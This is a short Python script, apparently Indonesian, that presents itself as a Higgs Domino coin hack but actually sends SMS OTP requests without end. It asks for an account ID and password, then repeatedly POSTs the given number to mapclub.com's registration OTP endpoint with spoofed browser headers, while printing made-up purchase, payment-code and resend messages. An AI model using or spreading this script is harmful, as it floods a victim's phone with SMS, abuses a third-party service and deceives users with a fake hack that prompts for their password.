import os,sys,time,requests,json
script=input('SCRIPT HACK KOIN DOMINO')
Author=input('By.Waylesiopat IMB 189')


nomor=input("Nomor ID akun:")
tulis=input('nomer sandi: ')
jumlah=input('koin 2b/1b:' )
proses=input('proccsesing.................')
while True:
      requests.post("https://beryllium.mapclub.com/api/member/registration/sms/otp",headers={"Host":"beryllium.mapclub.com","content-type":"application/json","accept-language":"en-US","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","origin":"https://www.mapclub.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.mapclub.com/","accept-encoding":"gzip, deflate, br"},data=json.dumps({"phone":"62"+nomor})).text
      time.sleep(10)
      print('proccses kirim data')
      time.sleep(5)
      print('ID terkirim')
      time.sleep(5)
      print('proses tranksaksi pembelian')
      time.sleep(5)
      print('www.toppatner.com/tokoKion www.higgsDomino.com')
      time.sleep(5)
      print('kode pembayaran :[AFH5H7CJGJ678Gh')
      print('succses terkirim')
      time.sleep(5)
      print('pengiriman gagal order tidak valid  kirim ulang status pembelian')

      print('proccsesing pengiriman ulang........................................................................')
      print('connect..erorr system tunggu stabil')
      os.system

